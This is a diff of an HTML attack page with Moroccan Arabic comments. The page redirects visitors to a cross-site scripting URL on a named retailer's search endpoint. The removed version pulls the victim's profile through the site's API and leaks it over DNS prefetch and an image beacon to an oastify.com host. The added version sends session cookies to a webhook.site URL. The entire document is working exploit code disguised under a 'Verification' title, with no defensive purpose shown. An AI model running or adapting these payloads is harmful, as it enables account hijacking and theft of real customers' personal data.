@@ -1,34 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Checking...</title>
+    <title>Verification...</title>
 </head>
 <body>
     <script>
-        // 1. هاد الكود غيتنفذ وسط Decathlon
-        // كيهز الـ JSON وكياخد منو غير السمية والـ ID باش يكون داكشي قصير
-        let code = `
-            fetch('https://www.decathlon.com/api/v1/user/profile',{credentials:'include'})
-            .then(r=>r.json())
-            .then(d=>{
-                let info = d.firstname + "_" + d.id;
-                // كنصيفطو الداتا عن طريق DNS Prefetch
-                let link = document.createElement('link');
-                link.rel = 'dns-prefetch';
-                link.href = '//' + info + '.aq4092b84mq2c8jf220asz3ft6zxnnbc.oastify.com';
-                document.head.appendChild(link);
-                
-                // الطريقة الثانية: تصويرة وهمية (Fallback)
-                let img = new Image();
-                img.src = 'https://aq4092b84mq2c8jf220asz3ft6zxnnbc.oastify.com/log?d=' + btoa(info);
-            })`;
-
-        let b64 = btoa(code);
+        // كود بسيط جداً: كيهز الكوكيز وكيرسلهم كـ اسم ديال صورة
+        let cookies = btoa(document.cookie).substring(0, 100); // هز غير طرف صغير للتجربة
+        let webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
         
-        // 2. الرابط الملغم (XSS)
-        let xss_url = "https://www.decathlon.com/search?q=<svg/onload=eval(atob('" + b64 + "'))>";
+        // كنصنعو رابط ديال صورة ملغم بالداتا
+        let target = "https://www.decathlon.com/search?q=<img src=x onerror=\"new Image().src='" + webhook + "?leak=' + btoa(document.cookie);\">";
         
-        window.location.href = xss_url;
+        window.location.href = target;
     </script>
 </body>
 </html>
